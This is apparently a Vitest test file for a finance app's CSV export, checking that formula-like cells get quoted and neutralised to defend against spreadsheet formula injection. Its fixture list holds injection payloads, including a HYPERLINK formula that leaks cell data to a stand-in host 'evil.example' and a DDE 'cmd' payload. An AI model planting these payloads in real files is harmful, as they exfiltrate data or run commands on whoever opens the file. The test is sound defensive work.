import { describe, it, expect, vi } from 'vitest'
import { readFileSync } from 'node:fs'
import Papa from 'papaparse'

// csv.js reaches Dexie for one constant; there is no IndexedDB in a node test.
vi.mock('../../db/db', () => ({ default: {}, UNSYNCED: 0 }))

const { csvCell, transactionsToCsv } = await import('./export')
const { parseCSV } = await import('./csv')

/**
 * A description is text anyone can type, or a file can carry, and Excel and
 * Sheets run a cell that starts with = + - or @ as a formula. Both CSV exports
 * wrote it as it was (the Reports one only doubled the quotes, the desktop one
 * only quoted a cell with a comma in it), so =HYPERLINK(...) in a note ran on
 * whoever opened the file.
 */

/** What a spreadsheet would try to run: the first character of a cell. */
const TRIGGER = /^[=+\-@\t\r]/

/** The strings the tester used, and the ones that follow from them. */
const FORMULAS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
  "=cmd|' /C calc'!A0",
  '+SUM(1,1)',
  '-2+3',
  '@SUM(1,1)',
  '\t=1+1',
  '\r=1+1',
  '=1+1',
]

describe('a text cell', () => {
  it.each(FORMULAS)('is made safe when it is %j', (text) => {
    const cell = csvCell(text)
    // Quoted, and the formula character is no longer the first one.
    expect(cell.startsWith('"\'')).toBe(true)
    expect(cell.slice(1)).not.toMatch(TRIGGER)
  })

  it('puts the apostrophe before the text and leaves the text as it was', () => {
    expect(csvCell('=SUM(1,1)')).toBe('"\'=SUM(1,1)"')
    expect(csvCell('-2+3')).toBe('"\'-2+3"')
    expect(csvCell('@home')).toBe('"\'@home"')
    expect(csvCell('+63 917')).toBe('"\'+63 917"')
  })

  it('handles each of the six characters on their own', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
      expect(csvCell(`${lead}x`)).toBe(`"'${lead}x"`)
    }
  })

  it('leaves alone a cell that only has such a character inside it', () => {
    expect(csvCell('Lunch - Jollibee')).toBe('"Lunch - Jollibee"')
    expect(csvCell('a=b')).toBe('"a=b"')
    expect(csvCell('2+2')).toBe('"2+2"')
    expect(csvCell('x@y')).toBe('"x@y"')
    expect(csvCell(' =1+1')).toBe('" =1+1"')
    expect(csvCell("'quoted")).toBe('"\'quoted"')
  })

  it('is always quoted, with its quotes doubled and its commas and lines kept inside', () => {
    expect(csvCell('plain')).toBe('"plain"')
    expect(csvCell('He said "hi"')).toBe('"He said ""hi"""')
    expect(csvCell('a, b')).toBe('"a, b"')
    expect(csvCell('two\nlines')).toBe('"two\nlines"')
    expect(csvCell('')).toBe('""')
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
  })

  it('doubles the quotes of a formula too, after the apostrophe', () => {
    expect(csvCell('=A("b")')).toBe('"\'=A(""b"")"')
  })

  it('is one cell once a CSV reader has it, whatever it holds', () => {
    const line = FORMULAS.map(csvCell).join(',')
    const [cells] = Papa.parse(line, { header: false }).data
    expect(cells).toHaveLength(FORMULAS.length)
    for (const [i, text] of FORMULAS.entries()) expect(cells[i]).toBe(`'${text}`)
  })
})

describe('a number cell', () => {
  it('is written as it is, so a negative amount stays a number', () => {
    expect(csvCell(-500)).toBe('-500')
    expect(csvCell(-0.5)).toBe('-0.5')
    expect(csvCell(1234.5)).toBe('1234.5')
    expect(csvCell(0)).toBe('0')
    expect(csvCell(5800)).toBe('5800')
  })

  it('is never quoted or given an apostrophe', () => {
    for (const n of [-1, -500, 12.5]) {
      expect(csvCell(n)).not.toMatch(/["']/)
    }
  })

  it('is an empty cell when it is not a finite number', () => {
    expect(csvCell(Number.NaN)).toBe('')
    expect(csvCell(Infinity)).toBe('')
    expect(csvCell(-Infinity)).toBe('')
  })

  it('is text when it is written as text, and so is protected like text', () => {
    expect(csvCell('-5')).toBe('"\'-5"')
    expect(csvCell('120')).toBe('"120"')
  })
})

describe('Reports > Transactions as CSV', () => {
  /** @type {Array<Record<string, any>>} */
  const ledger = FORMULAS.map((description, i) => ({
    txId: `t-${i}`, type: 'expense', date: '2026-09-10T04:00:00.000Z', description, category: 'Food', account: 'Cash', amount: -(i + 1) * 100,
  }))

  it('has no text cell a spreadsheet would run', () => {
    const { data } = Papa.parse(transactionsToCsv(ledger), { header: true, skipEmptyLines: true })
    expect(data).toHaveLength(FORMULAS.length)
    for (const row of /** @type {Array<Record<string, string>>} */ (data)) {
      for (const [column, value] of Object.entries(row)) {
        if (column === 'amount') continue
        expect(value, `${column}: ${JSON.stringify(value)}`).not.toMatch(TRIGGER)
      }
    }
  })

  it('writes a negative amount as a bare number', () => {
    const lines = transactionsToCsv(ledger).split('\r\n')
    // The amount sits after the nine text columns before it, with no quotes round it.
    expect(lines[1]).toMatch(/,"Cash","","",-100,/)
    const { data } = Papa.parse(transactionsToCsv(ledger), { header: true, skipEmptyLines: true })
    expect(/** @type {Array<Record<string, string>>} */ (data).map(r => Number(r.amount))).toEqual(ledger.map(t => t.amount))
  })

  it('writes a refund and a received amount as numbers, and a missing figure as an empty cell', () => {
    const csv = transactionsToCsv([
      { txId: 'a', type: 'transfer', date: '2026-09-10T04:00:00.000Z', description: '', category: '', fromAccount: 'A', toAccount: 'B', amount: 100, toAmount: 5800, toCurrency: 'PHP', baseAmount: -5800 },
      { txId: 'b', type: 'expense', date: '2026-09-10T04:00:00.000Z', description: '', category: 'Food', account: 'A', amount: 5 },
    ])
    const [first, second] = csv.split('\r\n').slice(1)
    expect(first).toContain(',100,"","","",5800,"PHP","",-5800,"",""')
    // No toAmount and no baseAmount: nothing between the commas, as before.
    expect(second).toMatch(/,5,"","","",,"","",,"",""$/)
  })

  it('reads back as the same descriptions, apostrophe off', () => {
    const { rows } = parseCSV(transactionsToCsv(ledger))
    expect(rows.map(r => r.description)).toEqual(FORMULAS.map(f => f.trim()))
    expect(rows.map(r => r.amount)).toEqual(ledger.map(t => t.amount))
  })

  it('reads back a description that only looks like a formula, whole', () => {
    const odd = ['-5% off', '+ top up', '@ Jollibee', '=> arrow', "'tis", 'a - b']
    const { rows } = parseCSV(transactionsToCsv(odd.map((description, i) => ({
      txId: `o-${i}`, type: 'expense', date: '2026-09-10T04:00:00.000Z', description, category: 'Food', account: 'Cash', amount: 1,
    }))))
    expect(rows.map(r => r.description)).toEqual(odd)
  })
})

/**
 * The desktop Transactions page's Export CSV is a function inside a component
 * file that is not exported (and drags the whole page with it), so it is run
 * here from its own source with its few outside names stubbed. What is under
 * test is what it does with a row: that its text goes through csvCell and its
 * amounts stay numbers.
 */
describe('desktop Transactions > Export CSV', () => {
  const MINUS = String.fromCodePoint(0x2212)
  const source = readFileSync(new URL('../../web/pages/WebTransactions.jsx', import.meta.url), 'utf8')

  /** The function's text: from its name to the brace that closes it. */
  function extract() {
    const start = source.indexOf('function exportCsv(')
    expect(start).toBeGreaterThan(-1)
    const open = source.indexOf('{', source.indexOf(')', start))
    let depth = 0
    for (let i = open; i < source.length; i++) {
      if (source[i] === '{') depth++
      else if (source[i] === '}' && --depth === 0) return source.slice(start, i + 1)
    }
    throw new Error('exportCsv is not closed')
  }

  /** @param {Array<Record<string, any>>} rows  @returns {string} the text of the file it wrote */
  function run(rows) {
    /** @type {string[]} */
    const written = []
    class FakeBlob { /** @param {string[]} parts */ constructor(parts) { written.push(parts.join('')) } }
    const deps = {
      isLoanPayment: () => false,
      unfoldLoanPayment: (/** @type {any} */ r) => r,
      amountDisplay: (/** @type {any} */ t) => ({ sign: t.amount < 0 || t.type === 'expense' ? MINUS : '', magnitude: Math.abs(t.amount), currency: 'PHP' }),
      isoToDateInput: (/** @type {string} */ d) => d.slice(0, 10),
      fmtTime: () => '12:30 PM',
      txRowWords: (/** @type {any} */ t) => ({ title: t.description }),
      txBase: (/** @type {any} */ t) => t.amount,
      csvCell,
      Blob: FakeBlob,
      URL: { createObjectURL: () => 'blob:x', revokeObjectURL: () => {} },
      document: { createElement: () => ({ click() {}, remove() {} }), body: { appendChild() {} } },
      setTimeout: () => 0,
    }
    const names = Object.keys(deps)
    const exportCsv = new Function(...names, `return ${extract()}`)(...Object.values(deps))
    exportCsv(rows, {})
    return written[0].replace(String.fromCodePoint(0xFEFF), '')
  }

  const rows = FORMULAS.map((description, i) => ({
    date: '2026-09-10T04:00:00.000Z', type: 'expense', description, category: 'Food', account: 'Cash', amount: (i + 1) * 100,
  }))

  it('takes its cells from the shared helper, not a copy of it', () => {
    expect(source).toMatch(/import \{ csvCell \} from '\.\.\/\.\.\/pages\/import\/export'/)
    expect(extract()).toContain('.map(csvCell)')
  })

  it('has no text cell a spreadsheet would run', () => {
    const { data } = Papa.parse(run(rows), { header: true, skipEmptyLines: true })
    expect(data).toHaveLength(FORMULAS.length)
    for (const row of /** @type {Array<Record<string, string>>} */ (data)) {
      for (const [column, value] of Object.entries(row)) {
        if (column === 'Amount' || column === 'Amount (base)') continue
        expect(value, `${column}: ${JSON.stringify(value)}`).not.toMatch(TRIGGER)
      }
    }
  })

  it('keeps the description, apostrophe in front of a formula', () => {
    const { data } = Papa.parse(run(rows), { header: true, skipEmptyLines: true })
    expect(/** @type {Array<Record<string, string>>} */ (data).map(r => r.Description)).toEqual(FORMULAS.map(f => `'${f}`))
  })

  it('writes the amounts as bare numbers, so a negative one stays one', () => {
    const text = run(rows)
    const line = text.split('\r\n')[1]
    expect(line).toMatch(/,-100,"PHP",-100$/)
    const { data } = Papa.parse(text, { header: true, skipEmptyLines: true })
    expect(/** @type {Array<Record<string, string>>} */ (data).map(r => Number(r.Amount))).toEqual(rows.map(r => -r.amount))
  })

  it('quotes every text cell', () => {
    const line = run(rows.slice(0, 1)).split('\r\n')[1]
    expect(line).toBe('"2026-09-10","12:30 PM","expense","\'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")","Food","Cash","","",-100,"PHP",-100')
  })
})
